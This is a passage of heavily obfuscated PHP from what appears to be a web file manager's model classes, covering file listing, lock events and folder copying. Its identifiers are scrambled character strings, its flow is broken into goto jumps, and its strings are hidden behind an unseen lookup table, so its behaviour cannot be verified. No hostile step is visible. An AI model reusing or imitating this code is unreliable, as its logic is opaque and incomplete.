($eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[405]] == $cé‘¢¢Ù“‘[87] && $eˆ§ô’ˆ£Ì[$cé‘¢¢Ù“‘[492]] == 0 && !isset($aš¬Ïä†ÓÍ[$b£Ëå²ì])) { $aš¬Ïä†ÓÍ[$b£Ëå²ì] = $this->_listAppendPathRoot($eˆ§ô’ˆ£Ì, array()); } goto aÃöÌ¸ñ; c…åÌ¦èÚ: foreach ($cŠõîÖãĞ as $d¬ŒÉËµ«ó => $b‚ÚŞØİ½†) { if (isset($aš¬Ïä†ÓÍ[$b‚ÚŞØİ½†])) { continue; } if ($d¬ŒÉËµ«ó == 0) { $aš¬Ïä†ÓÍ[$b‚ÚŞØİ½†] = $this->_listAppendPathRoot($eˆ§ô’ˆ£Ì, $cŠõîÖãĞ); } if ($d¬ŒÉËµ«ó != 0) { $eˆíææ¼¡[] = $b‚ÚŞØİ½†; } } goto c‡õíš¹Ç; c‡õíš¹Ç: } goto Bï´’ÁŸÇ; b¨Å»Øï¿½: $cé‘¢¢Ù“‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $aš¬Ïä†ÓÍ = array(); $eˆíææ¼¡ = array(); goto eÂÎ™ò©¢ƒ; FŞßîğ­«…: unset($eˆ§ô’ˆ£Ì); return $CæŠéÛë¿ˆ; goto cœÉ¶ÂÈ„„; cœÉ¶ÂÈ„„: } private function _listAppendPathRecycle(&$fÛ­‹İõÃŒ, $C»„¤’±’, $aÎÈãÉª¨) { goto e¥æÔä ÌÉ; eóÉğ½ÆÍ”: if ($fÛ­‹İõÃŒ[$cÖÜçÊĞÏ™[397]] == $aÎÈãÉª¨) { $fÛ­‹İõÃŒ[$cÖÜçÊĞÏ™[515]] = $cÖÜçÊĞÏ™[525]; $fÛ­‹İõÃŒ[$cÖÜçÊĞÏ™[492]] = $cÖÜçÊĞÏ™[191]; $fÛ­‹İõÃŒ[$cÖÜçÊĞÏ™[28]] = LNG($cÖÜçÊĞÏ™[524]); } $fÛ­‹İõÃŒ[$cÖÜçÊĞÏ™[526]] = $cÖÜçÊĞÏ™[527]; goto DÈ¼„Ÿ¤µÃ; a¼Œ¡Ïƒ¥: $f¡›„Âİš– = implode($cÖÜçÊĞÏ™[8], array_slice($b„ÕÚõ‘Ù‘, 2)); $fÛ­‹İõÃŒ[$cÖÜçÊĞÏ™[513]] = $cÖÜçÊĞÏ™[8] . LNG($cÖÜçÊĞÏ™[524]) . $cÖÜçÊĞÏ™[8] . ltrim($f¡›„Âİš–, $cÖÜçÊĞÏ™[8]); $fÛ­‹İõÃŒ[$cÖÜçÊĞÏ™[515]] = $cÖÜçÊĞÏ™[525] . implode($cÖÜçÊĞÏ™[47], array_slice($C»„¤’±’, 1)) . $cÖÜçÊĞÏ™[47]; goto eóÉğ½ÆÍ”; e¥æÔä ÌÉ: $cÖÜçÊĞÏ™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!in_array($aÎÈãÉª¨, $C»„¤’±’) && $fÛ­‹İõÃŒ[$cÖÜçÊĞÏ™[397]] != $aÎÈãÉª¨) { return; } $b„ÕÚõ‘Ù‘ = explode($cÖÜçÊĞÏ™[8], trim($fÛ­‹İõÃŒ[$cÖÜçÊĞÏ™[513]], $cÖÜçÊĞÏ™[8])); goto a¼Œ¡Ïƒ¥; DÈ¼„Ÿ¤µÃ: } protected function _listAppendPathRoot(&$aÄ¹—½çĞá, $b†ìÄÒÎà) { $CÔÍÅÛëÁ’ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a„Ù¿à¨È = $CÔÍÅÛëÁ’[33]; if ($aÄ¹—½çĞá[$CÔÍÅÛëÁ’[406]] == self::TYPE_USER) { if (defined($CÔÍÅÛëÁ’[468]) && $aÄ¹—½çĞá[$CÔÍÅÛëÁ’[498]] == USER_ID) { $a„Ù¿à¨È = LNG($CÔÍÅÛëÁ’[528]); if (!$b†ìÄÒÎà) { $aÄ¹—½çĞá[$CÔÍÅÛëÁ’[28]] = $a„Ù¿à¨È; } } else { $B±¤åÇ†– = Model($CÔÍÅÛëÁ’[507])->getInfoSimple($aÄ¹—½çĞá[$CÔÍÅÛëÁ’[498]]); $a„Ù¿à¨È = LNG($CÔÍÅÛëÁ’[529]) . $CÔÍÅÛëÁ’[160] . $B±¤åÇ†–[$CÔÍÅÛëÁ’[28]] . $CÔÍÅÛëÁ’[530]; } } else { if ($aÄ¹—½çĞá[$CÔÍÅÛëÁ’[406]] == self::TYPE_GROUP) { $B±¤åÇ†– = Model($CÔÍÅÛëÁ’[516])->getInfoSimple($aÄ¹—½çĞá[$CÔÍÅÛëÁ’[498]]); $a„Ù¿à¨È = $B±¤åÇ†–[$CÔÍÅÛëÁ’[28]]; } else { if ($aÄ¹—½çĞá[$CÔÍÅÛëÁ’[406]] == self::TYPE_SYSTEM) { $a„Ù¿à¨È = $CÔÍÅÛëÁ’[531]; } } } $a„Ù¿à¨È = $a„Ù¿à¨È ? $CÔÍÅÛëÁ’[8] . $a„Ù¿à¨È . $CÔÍÅÛëÁ’[8] : $CÔÍÅÛëÁ’[8]; return $a„Ù¿à¨È; } protected function _listAppendUser(&$FÜö§¾ªÙô) { goto e¦„Œ…È¥Š; e¦„Œ…È¥Š: $b¼ñ˜°Šè =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F“”ä¯„®’ = array_to_keyvalue($FÜö§¾ªÙô, $b¼ñ˜°Šè[33], $b¼ñ˜°Šè[446]); $aÌÉõâÃ¾ = array_to_keyvalue($FÜö§¾ªÙô, $b¼ñ˜°Šè[33], $b¼ñ˜°Šè[448]); goto Bİ²¢Îğõ; CøŸ§ñÎ²: unset($eï¿óÊËğœ); goto cÆ¿ˆ§Œî; Bİ²¢Îğõ: $d–¸­å–ª = array_merge($F“”ä¯„®’, $aÌÉõâÃ¾); $Dİ…Ô‹óÕÑ = Model($b¼ñ˜°Šè[532])->userListInfo($d–¸­å–ª); foreach ($FÜö§¾ªÙô as &$eï¿óÊËğœ) { $bŒø­áÊ† = $eï¿óÊËğœ[$b¼ñ˜°Šè[446]]; $eï¿óÊËğœ[$b¼ñ˜°Šè[446]] = $Dİ…Ô‹óÕÑ[$bŒø­áÊ†] ? $Dİ…Ô‹óÕÑ[$bŒø­áÊ†] : !1; $bŒø­áÊ† = $eï¿óÊËğœ[$b¼ñ˜°Šè[448]]; $eï¿óÊËğœ[$b¼ñ˜°Šè[448]] = $Dİ…Ô‹óÕÑ[$bŒø­áÊ†] ? $Dİ…Ô‹óÕÑ[$bŒø­áÊ†] : !1; if (isset($eï¿óÊËğœ[$b¼ñ˜°Šè[459]]) && $eï¿óÊËğœ[$b¼ñ˜°Šè[459]][$b¼ñ˜°Šè[533]]) { $Då¿ÎÖóŒ„ = $GLOBALS[$b¼ñ˜°Šè[6]][$b¼ñ˜°Šè[88]][$b¼ñ˜°Šè[534]]; if ($eï¿óÊËğœ[$b¼ñ˜°Šè[459]][$b¼ñ˜°Šè[535]] <= time() - $Då¿ÎÖóŒ„) { $this->metaSet($eï¿óÊËğœ[$b¼ñ˜°Šè[397]], $b¼ñ˜°Šè[533], null); $this->metaSet($eï¿óÊËğœ[$b¼ñ˜°Šè[397]], $b¼ñ˜°Šè[535], null); unset($eï¿óÊËğœ[$b¼ñ˜°Šè[459]][$b¼ñ˜°Šè[533]]); continue; } $A‰ÇŞÚñ£Ê = $eï¿óÊËğœ[$b¼ñ˜°Šè[459]][$b¼ñ˜°Šè[533]]; $eï¿óÊËğœ[$b¼ñ˜°Šè[459]][$b¼ñ˜°Šè[536]] = Model($b¼ñ˜°Šè[532])->getInfoSimpleOuter($A‰ÇŞÚñ£Ê); } } goto CøŸ§ñÎ²; cÆ¿ˆ§Œî: } public function parentLevelArray($dÜÅŒâêŸ¶) { $B÷ÈÈƒÄµ» =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dÜÅŒâêŸ¶ = explode($B÷ÈÈƒÄµ»[47], trim($dÜÅŒâêŸ¶, $B÷ÈÈƒÄµ»[47])); return array_remove_value($dÜÅŒâêŸ¶, $B÷ÈÈƒÄµ»[191]); } public function listAll($E—âÁŠŒÓÅ) { goto B÷¸¶ªŸ‰ù; E÷ç½Ğ©óá: $d‚çŸ“øÛ = $Bİ…Ÿ‘‹¾ä[541]; $aĞÊŸš™ƒ = "\114\x45\106\x54\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x66\151\154\x65\x20\146\x69\x6c\x65\40\157\x6e\40\x73\157\165\x72\143\x65\x2e\x66\151\154\145\111\104\40\75\40\x66\151\154\145\x2e\146\151\154\x65\x49\x44"; $F——ÎŞ•’ù = $this->alias($Bİ…Ÿ‘‹¾ä[438])->field($d‚çŸ“øÛ)->where($fÔãŞ¯å)->join($aĞÊŸš™ƒ)->select(); goto aŒ°è¼†ÖÈ; B÷¸¶ªŸ‰ù: $Bİ…Ÿ‘‹¾ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aº‚‰… İç = $this->sourceInfo($E—âÁŠŒÓÅ); $fÔãŞ¯å = array($Bİ…Ÿ‘‹¾ä[537] => array($Bİ…Ÿ‘‹¾ä[538], $aº‚‰… İç[$Bİ…Ÿ‘‹¾ä[515]] . $E—âÁŠŒÓÅ . $Bİ…Ÿ‘‹¾ä[539]), $Bİ…Ÿ‘‹¾ä[540] => 0); goto E÷ç½Ğ©óá; FÌâæ¤Ú÷•: $e½õâ¿Øà = array(); foreach ($F——ÎŞ•’ù as $d…«£à¿Ï => $Bó½„é”Äì) { goto DŠÀÉƒ‰ÀÇ; AŠ³–„çÍÄ: $D±†ô«¹ø‹ = str_replace($Bİ…Ÿ‘‹¾ä[523], $Bİ…Ÿ‘‹¾ä[8], $D±†ô«¹ø‹); $D±†ô«¹ø‹ = str_replace($Bİ…Ÿ‘‹¾ä[523], $Bİ…Ÿ‘‹¾ä[8], $D±†ô«¹ø‹); $E¯Ôâ¯ŠÄ = array($Bİ…Ÿ‘‹¾ä[416] => str_replace($Bİ…Ÿ‘‹¾ä[523], $Bİ…Ÿ‘‹¾ä[8], $D±†ô«¹ø‹), $Bİ…Ÿ‘‹¾ä[542] => intval($Bó½„é”Äì[$Bİ…Ÿ‘‹¾ä[405]]), $Bİ…Ÿ‘‹¾ä[85] => $this->pathInfoFilter($Bó½„é”Äì)); goto aËë‹Â†›; DŠÀÉƒ‰ÀÇ: $bâñ¥³Ÿó  = $this->parentLevelArray($Bó½„é”Äì[$Bİ…Ÿ‘‹¾ä[515]]); array_shift($bâñ¥³Ÿó ); $D±†ô«¹ø‹ = $bÎÉÜ„·Ñò; goto BÅ§¤‚£‚ç; BÅ§¤‚£‚ç: for ($C‹¯…ê°ƒˆ = 0; $C‹¯…ê°ƒˆ < count($bâñ¥³Ÿó ); $C‹¯…ê°ƒˆ++) { $D±†ô«¹ø‹ .= $F——ÎŞ•’ù[$bâñ¥³Ÿó [$C‹¯…ê°ƒˆ]][$Bİ…Ÿ‘‹¾ä[28]] . $Bİ…Ÿ‘‹¾ä[8]; } $D±†ô«¹ø‹ .= $Bó½„é”Äì[$Bİ…Ÿ‘‹¾ä[28]]; if ($Bó½„é”Äì[$Bİ…Ÿ‘‹¾ä[405]]) { $D±†ô«¹ø‹ .= $Bİ…Ÿ‘‹¾ä[8]; } goto AŠ³–„çÍÄ; aËë‹Â†›: if (!$Bó½„é”Äì[$Bİ…Ÿ‘‹¾ä[405]]) { $E¯Ôâ¯ŠÄ[$Bİ…Ÿ‘‹¾ä[461]] = $Bó½„é”Äì[$Bİ…Ÿ‘‹¾ä[461]]; $E¯Ôâ¯ŠÄ[$Bİ…Ÿ‘‹¾ä[86]] = $Bó½„é”Äì[$Bİ…Ÿ‘‹¾ä[76]]; } $e½õâ¿Øà[] = $E¯Ôâ¯ŠÄ; goto a¤ ¢È¦ò“; a¤ ¢È¦ò“: } return $e½õâ¿Øà; goto Eˆ²õ ‰œ; a°óßÉ«: $F——ÎŞ•’ù = array_to_keyvalue($F——ÎŞ•’ù, $Bİ…Ÿ‘‹¾ä[397]); $bÎÉÜ„·Ñò = "\x2f{$aº‚‰… İç[$Bİ…Ÿ‘‹¾ä[28]]}\x2f"; $bÎÉÜ„·Ñò = $bÎÉÜ„·Ñò == $Bİ…Ÿ‘‹¾ä[523] ? $Bİ…Ÿ‘‹¾ä[8] : $bÎÉÜ„·Ñò; goto FÌâæ¤Ú÷•; aŒ°è¼†ÖÈ: $this->_listAppendAuth($F——ÎŞ•’ù); $this->_listAppendUser($F——ÎŞ•’ù); $this->_listAppendPath($F——ÎŞ•’ù); goto a°óßÉ«; Eˆ²õ ‰œ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($d³Ò†Õ¾Ô®) { goto côÍæ‰—ğĞ; côÍæ‰—ğĞ: $b±…ÆÅˆËæ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->allowLock()) { return; } $this->_lockCheck($b±…ÆÅˆËæ[543], $d³Ò†Õ¾Ô®); goto eŠæÉåç®; dÃÃ¨‚£äÜ: $this->_lockEvent($d³Ò†Õ¾Ô®, array($b±…ÆÅˆËæ[546], $b±…ÆÅˆËæ[547]), $E İ¬×æôÛ); $this->_lockCheckEnd($b±…ÆÅˆËæ[543], $d³Ò†Õ¾Ô®); goto Aóõ²øìÃº; eŠæÉåç®: $E İ¬×æôÛ = 1; $this->_lockEvent($d³Ò†Õ¾Ô®, array($b±…ÆÅˆËæ[544], $b±…ÆÅˆËæ[545]), $E İ¬×æôÛ); $this->_lockParent($d³Ò†Õ¾Ô®, array($b±…ÆÅˆËæ[545]), $E İ¬×æôÛ); goto dÃÃ¨‚£äÜ; Aóõ²øìÃº: } public function lockCopyEnd($B‰Øë«à¿Ë) { $A©à¡•‰Ÿ¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->allowLock()) { return; } $E±½Ô†•‚® = 0; $this->_lockEvent($B‰Øë«à¿Ë, array($A©à¡•‰Ÿ¤[544], $A©à¡•‰Ÿ¤[545]), $E±½Ô†•‚®); $this->_lockParent($B‰Øë«à¿Ë, array($A©à¡•‰Ÿ¤[545]), $E±½Ô†•‚®); $this->_lockEvent($B‰Øë«à¿Ë, array($A©à¡•‰Ÿ¤[546], $A©à¡•‰Ÿ¤[547]), $E±½Ô†•‚®); } public function lockWriteStart($c«‰Ù´À­¸, $Eˆ“µ¢ëã = '') { goto aôœËŞ×Ñ; fâô»ÔÇ³Ù: $this->_lockParent($c«‰Ù´À­¸, array($FÑˆ·ÇªöØ[543], $FÑˆ·ÇªöØ[545]), $eæø¾ÆÎ’); $this->_lockCheckEnd($FÑˆ·ÇªöØ[544], $c«‰Ù´À­¸); goto EòŒ‹³‡Ä“; fÙ‡ÃˆöË¶: $eæø¾ÆÎ’ = 1; $this->_lockKey($FÑˆ·ÇªöØ[548] . $c«‰Ù´À­¸ . $FÑˆ·ÇªöØ[95] . $Eˆ“µ¢ëã, $eæø¾ÆÎ’); $this->_lockEvent($c«‰Ù´À­¸, array($FÑˆ·ÇªöØ[543], $FÑˆ·ÇªöØ[545]), $eæø¾ÆÎ’); goto fâô»ÔÇ³Ù; aôœËŞ×Ñ: $FÑˆ·ÇªöØ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->allowLock()) { return; } $this->_lockCheck($FÑˆ·ÇªöØ[544], $c«‰Ù´À­¸); goto fÙ‡ÃˆöË¶; EòŒ‹³‡Ä“: } public function lockWriteEnd($dà‹¨ƒ—‹ë, $C³Ë‰‚„²Ï = '') { $b³¹´ÙÏóŠ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->allowLock()) { return; } $d¾…˜ÊÆÏá = 0; $this->_lockKey($b³¹´ÙÏóŠ[548] . $dà‹¨ƒ—‹ë . $b³¹´ÙÏóŠ[95] . $C³Ë‰‚„²Ï, $d¾…˜ÊÆÏá); $this->_lockEvent($dà‹¨ƒ—‹ë, array($b³¹´ÙÏóŠ[543], $b³¹´ÙÏóŠ[545]), $d¾…˜ÊÆÏá); $this->_lockParent($dà‹¨ƒ—‹ë, array($b³¹´ÙÏóŠ[543], $b³¹´ÙÏóŠ[545]), $d¾…˜ÊÆÏá); } public function lockMoveStart($b¾Äô¶œÀâ) { goto eŸõ–¾Œ‘ç; eŸõ–¾Œ‘ç: $EëŸÕĞ±‘ç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->allowLock()) { return; } $this->_lockCheck($EëŸÕĞ±‘ç[545], $b¾Äô¶œÀâ); goto aÀ‘Ò‘Œ¸‘; CË˜¡‹¼Éš: $this->_lockParent($b¾Äô¶œÀâ, array($EëŸÕĞ±‘ç[543], $EëŸÕĞ±‘ç[545]), $E‰Æ½„ÁÑ); $this->_lockEvent($b¾Äô¶œÀâ, array($EëŸÕĞ±‘ç[550], $EëŸÕĞ±‘ç[546], $EëŸÕĞ±‘ç[547]), $E‰Æ½„ÁÑ); $this->_lockCheckEnd($EëŸÕĞ±‘ç[545], $b¾Äô¶œÀâ); goto e¶“ŠÎŒÊ; aÀ‘Ò‘Œ¸‘: $E‰Æ½„ÁÑ = 1; $this->_lockKey($EëŸÕĞ±‘ç[549] . $b¾Äô¶œÀâ, $E‰Æ½„ÁÑ); $this->_lockEvent($b¾Äô¶œÀâ, array($EëŸÕĞ±‘ç[543], $EëŸÕĞ±‘ç[544]), $E‰Æ½„ÁÑ); goto CË˜¡‹¼Éš; e¶“ŠÎŒÊ: } public function lockMoveEnd($Fò¥¾¶ƒ„Ú) { goto e­Œè«Ğ£; fÊèºèğ†À: $this->_lockEvent($Fò¥¾¶ƒ„Ú, array($C•íˆÇ’ĞÑ[550], $C•íˆÇ’ĞÑ[546], $C•íˆÇ’ĞÑ[547]), $Aî‹àï¡Ø¢); goto cÔÎ‹ó±ÂÚ; e­Œè«Ğ£: $C•íˆÇ’ĞÑ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->allowLock()) { return; } $Aî‹àï¡Ø¢ = 0; goto A¹…ÊŠ¯; A¹…ÊŠ¯: $this->_lockKey($C•íˆÇ’ĞÑ[549] . $Fò¥¾¶ƒ„Ú, $Aî‹àï¡Ø¢); $this->_lockEvent($Fò¥¾¶ƒ„Ú, array($C•íˆÇ’ĞÑ[543], $C•íˆÇ’ĞÑ[544]), $Aî‹àï¡Ø¢); $this->_lockParent($Fò¥¾¶ƒ„Ú, array($C•íˆÇ’ĞÑ[543], $C•íˆÇ’ĞÑ[545]), $Aî‹àï¡Ø¢); goto fÊèºèğ†À; cÔÎ‹ó±ÂÚ: } private function _lockCheck($DŠŸÀÖ´ì±, $fÍ»Ï¹‡ë±) { goto aÁ¶ÏöÄ; aªîÔ¢ğ‡: $this->_lockTimeStart[$eÊ—äÃï] = timeFloat(); if (!is_array($cÚÇÊ¤£)) { return; } $cŸİ÷‹è˜ = LNG($c¥¿†è•‚[551]); goto AÖÓ‡¡Ç¿ì; aÁ¶ÏöÄ: $c¥¿†è•‚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÚÇÊ¤£ = $this->sourceInfo($fÍ»Ï¹‡ë±); $eÊ—äÃï = $DŠŸÀÖ´ì± . $c¥¿†è•‚[95] . $fÍ»Ï¹‡ë±; goto aªîÔ¢ğ‡; AÖÓ‡¡Ç¿ì: CacheLock::setErrorMsg($c¥¿†è•‚[160] . htmlspecialchars($cÚÇÊ¤£[$c¥¿†è•‚[28]]) . $c¥¿†è•‚[530] . $cŸİ÷‹è˜); $this->_lockKey($eÊ—äÃï, 1); $this->_lockKey($eÊ—äÃï, 0); goto bêí’šÅÍ; bêí’šÅÍ: $a”ñÜ«õø = array_reverse($this->parentLevelArray($cÚÇÊ¤£[$c¥¿†è•‚[515]])); foreach ($a”ñÜ«õø as $BÒä×å“»Î) { $eÊ—äÃï = $DŠŸÀÖ´ì± . $c¥¿†è•‚[552] . $BÒä×å“»Î; if (CacheLock::lockGet($c¥¿†è•‚[553] . $eÊ—äÃï)) { $cÚÇÊ¤£ = $this->sourceInfo($BÒä×å“»Î); CacheLock::setErrorMsg($c¥¿†è•‚[160] . htmlspecialchars($cÚÇÊ¤£[$c¥¿†è•‚[28]]) . $c¥¿†è•‚[530] . $cŸİ÷‹è˜); $this->_lockKey($eÊ—äÃï, 1); $this->_lockKey($eÊ—äÃï, 0); } } goto fŸù†ÉÆƒÖ; fŸù†ÉÆƒÖ: } private function _lockCheckEnd($bŸŸŒä¨·, $Eğ´ƒÎ²î) { goto eÌ„ë„Ûâ; bí­õëîÛÏ: if ($EÍ‚±ğÃ’¤ > 0.5) { unset(self::$cacheSourceInfo[$E ¬ÖÔÆêñ[452] . $Eğ´ƒÎ²î]); } $FÍÆêñ÷… = $this->sourceInfo($Eğ´ƒÎ²î); if (!$FÍÆêñ÷…) { show_json(LNG($E ¬ÖÔÆêñ[105]), !1); } goto Fã²…ƒÙÊí; eÌ„ë„Ûâ: $E ¬ÖÔÆêñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b”òšˆ‡Á“ = $bŸŸŒä¨· . $E ¬ÖÔÆêñ[95] . $Eğ´ƒÎ²î; CacheLock::setErrorMsg($E ¬ÖÔÆêñ[376]); goto D¨¼ÔßËÆ; D¨¼ÔßËÆ: if (!isset($this->_lockTimeStart[$b”òšˆ‡Á“])) { return; } $EÍ‚±ğÃ’¤ = timeFloat() - $this->_lockTimeStart[$b”òšˆ‡Á“]; unset($this->_lockTimeStart[$b”òšˆ‡Á“]); goto bí­õëîÛÏ; Fã²…ƒÙÊí: } private function _lockParent($få¢¢ƒé, $EÂÎ¨–ã‘÷, $dÕ·Ö¹»ö) { if (!$this->autoLockSet) { return; } $BÌ¡Ù¥òÌ = $this->sourceInfo($få¢¢ƒé); if (!is_array($BÌ¡Ù¥òÌ)) { return; } $f©†§‰ĞÇ´ = array_reverse($this->parentLevelArray($BÌ¡Ù¥òÌ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][515]])); foreach ($f©†§‰ĞÇ´ as $Fñ†ª¼ŞÔ˜) { $this->_lockEvent($Fñ†ª¼ŞÔ˜, $EÂÎ¨–ã‘÷, $dÕ·Ö¹»ö); } } private function _lockEvent($a¿Šœ´†íŠ, $fÍ² Ùâ“, $BÔäÄ‚÷‹Ä) { $eÌ³òéß¸® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->autoLockSet) { return; } foreach ($fÍ² Ùâ“ as $f“İìâÇ†) { $BƒÀ«ë‰‡ = $f“İìâÇ† . $eÌ³òéß¸®[95] . $a¿Šœ´†íŠ; if ($BÔäÄ‚÷‹Ä && CacheLock::lockGet($eÌ³òéß¸®[553] . $BƒÀ«ë‰‡)) { continue; } $this->_lockKey($BƒÀ«ë‰‡, $BÔäÄ‚÷‹Ä); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($aƒª‰›àÓ, $CªªÕÚ„÷Õ = 1) { $C¥åÕ¿šÍ“ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][553] . md5($aƒª‰›àÓ); if ($CªªÕÚ„÷Õ) { if (isset(self::$_lockItemArr[$C¥åÕ¿šÍ“])) { return; } self::$_lockItemArr[$C¥åÕ¿šÍ“] = 1; CacheLock::lock($C¥åÕ¿šÍ“, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$C¥åÕ¿šÍ“])) { return; } unset(self::$_lockItemArr[$C¥åÕ¿šÍ“]); CacheLock::unlock($C¥åÕ¿šÍ“); } } public function isParentOf($B£¡®ªˆš‹, $B÷ğŠ¶Ş°ˆ) { goto fŒÛÛ§Ä‡ˆ; D“Ş‹ˆˆ‡‘: $D·ğ ƒÍªê = $aÍİÚßâ÷¯[$E©‰¦ªŸÀ‚[515]] . $aÍİÚßâ÷¯[$E©‰¦ªŸÀ‚[397]] . $E©‰¦ªŸÀ‚[47]; $E¤™µñå¿ = $C¢ó¬ØÜ…ö[$E©‰¦ªŸÀ‚[515]] . $C¢ó¬ØÜ…ö[$E©‰¦ªŸÀ‚[397]] . $E©‰¦ªŸÀ‚[47]; $DÓó†Õ©±¯ = strpos($E¤™µñå¿, $D·ğ ƒÍªê) === 0; goto F¿íÁÕÌ¦Á; fŒÛÛ§Ä‡ˆ: $E©‰¦ªŸÀ‚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÍİÚßâ÷¯ = $this->sourceInfo($B£¡®ªˆš‹); $C¢ó¬ØÜ…ö = $this->sourceInfo($B÷ğŠ¶Ş°ˆ); goto D“Ş‹ˆˆ‡‘; F¿íÁÕÌ¦Á: return $DÓó†Õ©±¯; goto aÑëˆŸ‹ØÇ; aÑëˆŸ‹ØÇ: } private $targetIsDelete = 0; public function copy($b¯‚®¡‡ĞŠ, $F•î¥ÂÁ¯Ë, $EóøÖ›šÊ = REPEAT_REPLACE, $AôˆÓ‚œª = '') { goto c’ìğ“£°ƒ; eåáÑÎ™: $this->updateModifyTime($F•î¥ÂÁ¯Ë); return $DÂíñ¹÷¬; goto a‘ó‡çé™; dÉƒ„Ø¸: if ($Eøƒø…Òˆ²[$Aš£¡À–Òˆ[405]] == $Aš£¡À–Òˆ[87] && $F…›÷¿˜ËÁ == $DÂíñ¹÷¬) { $this->folderSizeResetChildren($F…›÷¿˜ËÁ); } Model($Aš£¡À–Òˆ[557])->addAll($e«šù‡ëÛç[$Aš£¡À–Òˆ[555]], array(), !0); if ($F…›÷¿˜ËÁ != $DÂíñ¹÷¬ || $Eøƒø…Òˆ²[$Aš£¡À–Òˆ[405]] == $Aš£¡À–Òˆ[87]) { Model($Aš£¡À–Òˆ[558])->eventCopy($DÂíñ¹÷¬); } goto B«†”â; D½´—‰ëÍ: $this->lockCopyStart($b¯‚®¡‡ĞŠ); $this->lockWriteStart($F•î¥ÂÁ¯Ë, $c¸òÒò„’Õ); $e«šù‡ëÛç = array($Aš£¡À–Òˆ[554] => array(), $Aš£¡À–Òˆ[555] => array(), $Aš£¡À–Òˆ[556] => array()); goto E¨¨˜è‘áù; c’ìğ“£°ƒ: $Aš£¡À–Òˆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Eøƒø…Òˆ² = $this->sourceInfo($b¯‚®¡‡ĞŠ); $BÇùä·„³ = $this->sourceInfo($F•î¥ÂÁ¯Ë); goto f“¼¨ù÷õ; B«†”â: $this->saveAll($e«šù‡ëÛç[$Aš£¡À–Òˆ[556]]); Model($Aš£¡À–Òˆ[193])->linkAdd($e«šù‡ëÛç[$Aš£¡À–Òˆ[554]]); $this->folderSizeReset($F•î¥ÂÁ¯Ë); goto eåáÑÎ™; E¨¨˜è‘áù: $this->targetIsDelete = intval($Eøƒø…Òˆ²[$Aš£¡À–Òˆ[425]]); $F…›÷¿˜ËÁ = $this->fileNameExistCache($F•î¥ÂÁ¯Ë, $Eøƒø…Òˆ²[$Aš£¡À–Òˆ[28]]); $DÂíñ¹÷¬ = $this->_copy($b¯‚®¡‡ĞŠ, $F•î¥ÂÁ¯Ë, $EóøÖ›šÊ, $e«šù‡ëÛç, !0, $AôˆÓ‚œª); goto BØ›è‚Û¤; f“¼¨ù÷õ: if (!$Eøƒø…Òˆ² || !$BÇùä·„³ || $BÇùä·„³[$Aš£¡À–Òˆ[405]] != $Aš£¡À–Òˆ[87]) { return !1; } if ($this->isParentOf($b¯‚®¡‡ĞŠ, $F•î¥ÂÁ¯Ë)) { return !1; } $c¸òÒò„’Õ = $AôˆÓ‚œª ? $AôˆÓ‚œª : $Eøƒø…Òˆ²[$Aš£¡À–Òˆ[28]]; goto D½´—‰ëÍ; BØ›è‚Û¤: $this->_childrenListClear(); $this->lockCopyEnd($b¯‚®¡‡ĞŠ); $this->lockWriteEnd($F•î¥ÂÁ¯Ë, $c¸òÒò„’Õ); goto dÉƒ„Ø¸; a‘ó‡çé™: } private function _copy($b‡•ÙîÉ½Û, $EÇ—ô¡Âßˆ, $f“õë³³ÁÍ, &$BÓÙšÆ±çê, $CßñÅÉœê, $A¡¾²Ï¥ò¾ = '') { goto B±Ì„°‚©; B±Ì„°‚©: $FíÉñó××Æ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e³ã ÈÒ‰ = $this->sourceInfoCache($b‡•ÙîÉ½Û); $aœˆâ¸‹‹Ï = $e³ã ÈÒ‰[$FíÉñó××Æ[405]] == $FíÉñó××Æ[87]; goto c¡Ç‘ì®“; FÊÙŸ‘„«: if (!$BğŒŒÎò‘) { return $this->_copyCreate($b‡•ÙîÉ½Û, $EÇ—ô¡Âßˆ, $f¶˜¬¦ì, $BÓÙšÆ±çê); } $f’´¤‹à‚© = $BğŒŒÎò‘; if ($aœˆâ¸‹‹Ï) { if ($f“õë³³ÁÍ == REPEAT_RENAME_FOLDER) { $f¶˜¬¦ì = $this->fileNameAutoCache($EÇ—ô¡Âßˆ, $f¶˜¬¦ì, $f“õë³³ÁÍ, $aœˆâ¸‹‹Ï); $f’´¤‹à‚© = $this->_copyCreate($b‡•ÙîÉ½Û, $EÇ—ô¡Âßˆ, $f¶˜¬¦ì, $BÓÙšÆ±çê); } else { $c¹ƒ¿ÁĞíŠ = $this->_childrenList($b‡•ÙîÉ½Û); foreach ($c¹ƒ¿ÁĞíŠ as $eèñ†å±¹…) { $this->_copy($eèñ†å±¹…[$FíÉñó××Æ[397]], $BğŒŒÎò‘, $f“õë³³ÁÍ, $BÓÙšÆ±çê, !1); } } } else { if ($f“õë³³ÁÍ == REPEAT_RENAME || $f“õë³³ÁÍ == REPEAT_RENAME_FOLDER) { $f¶˜¬¦ì = 